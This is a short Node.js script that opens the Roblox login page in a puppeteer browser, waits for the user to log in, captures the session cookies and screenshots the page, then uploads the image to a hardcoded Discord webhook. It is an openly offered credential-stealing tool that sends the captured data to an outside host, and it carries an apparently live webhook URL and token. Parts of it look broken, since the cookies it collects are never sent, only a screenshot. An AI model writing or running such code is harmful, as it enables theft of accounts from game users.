const axios = require('axios');
const puppeteer = require('puppeteer');
const fs = require('fs');

const webhookUrl = 'https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL'; // Replace with your Discord webhook URL

async function captureCookies() {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    // Navigate to the Roblox login page
    await page.goto('https://www.roblox.com/login');

    // Wait for the user to log in
    await page.waitForSelector('#login-button');

    // Capture cookies
    const cookies = await page.cookies();

    // Take a screenshot of the cookies
    await page.screenshot({ path: 'cookies.png' });

    // Send the image to Discord
    const imageBuffer = fs.readFileSync('cookies.png');
    const formData = new FormData();
    formData.append('file', imageBuffer, 'cookies.png');

    await axios.post(webhookUrl, formData, {
        headers: {
            'Content-Type': 'multipart/form-data'
        }
    });

    // Close the browser
    await browser.close();
}

captureCookies().catch(console.error);
